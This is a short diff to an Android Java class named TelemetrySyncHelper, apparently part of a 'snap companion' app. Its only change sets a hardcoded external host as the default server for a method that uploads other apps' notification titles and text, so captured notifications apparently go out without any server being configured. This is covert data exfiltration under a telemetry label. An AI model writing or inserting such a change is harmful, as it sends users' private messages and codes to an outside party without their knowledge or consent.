@@ -40,7 +40,7 @@ public class TelemetrySyncHelper {
     public static void uploadNotification(Context ctx, String pkg, String appName, String title, String text, long postTime) {
         if (ctx == null || !isFeatureEnabled(ctx, "notifications")) return;
         SharedPreferences prefs = ctx.getSharedPreferences("snap_companion_prefs", Context.MODE_PRIVATE);
-        String serverUrl = prefs.getString("server_url", "");
+        String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
         String deviceId = prefs.getString("device_id", "");
         if (serverUrl.isEmpty() || deviceId.isEmpty()) return;
 
